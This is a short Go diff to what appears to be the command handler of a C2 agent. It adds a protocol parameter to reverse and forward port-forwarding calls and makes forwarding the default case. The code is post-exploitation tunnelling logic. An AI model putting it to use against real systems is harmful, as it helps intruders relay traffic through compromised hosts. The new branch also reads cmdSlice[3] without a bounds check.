@@ -140,21 +140,20 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			go func() {
 				addr := cmdSlice[1]
 				sessionID := cmdSlice[2]
-				err = PortFwd(addr, sessionID, true)
+				err = PortFwd(addr, sessionID, "tcp", true)
 				if err != nil {
 					out = fmt.Sprintf("PortFwd (reverse) failed: %v", err)
 				}
 			}()
-		case "on":
+		default:
 			go func() {
 				to := cmdSlice[1]
 				sessionID := cmdSlice[2]
-				err = PortFwd(to, sessionID, false)
+				err = PortFwd(to, sessionID, cmdSlice[3], false)
 				if err != nil {
 					out = fmt.Sprintf("PortFwd failed: %v", err)
 				}
 			}()
-		default:
 		}
 
 		return
